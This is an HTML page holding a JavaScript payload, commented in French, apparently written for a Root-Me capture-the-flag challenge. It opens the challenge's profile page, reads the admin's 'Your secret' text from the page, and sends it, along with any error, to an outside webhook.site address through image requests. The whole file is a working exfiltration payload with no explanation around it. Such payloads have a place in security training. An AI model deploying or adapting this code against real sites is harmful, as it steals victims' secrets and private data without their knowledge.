<html>
<script>
// === Simuler une popup pour garder le style CTF ===
var win = window.open("http://challenge01.root-me.org:58003/profile", "_blank"); // popup vide, même origine

// === Fonction pour exfiltrer le secret ===
function exfiltrateSecret() {
    try {
        // Chercher le secret dans la page courante (la page de l'admin)
        var match = document.body.innerText.match(/Your secret:\s*(.+)/);
        if(match && match[1]){
            var secret = match[1];
            // Envoi au webhook
            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
        } else {
            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=Secret_not_found';
        }
    } catch(e){
        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
    }
}

// === Listener simulé ===
window.addEventListener('message', function(event) {
    // On déclenche l'exfiltration même si le message est simulé
    setTimeout(exfiltrateSecret, 500);
});

// === Déclencher le listener simulé après un court délai ===
setTimeout(function() {
    window.dispatchEvent(new MessageEvent('message', {data: 'trigger'}));
}, 500);
</script>
</html>
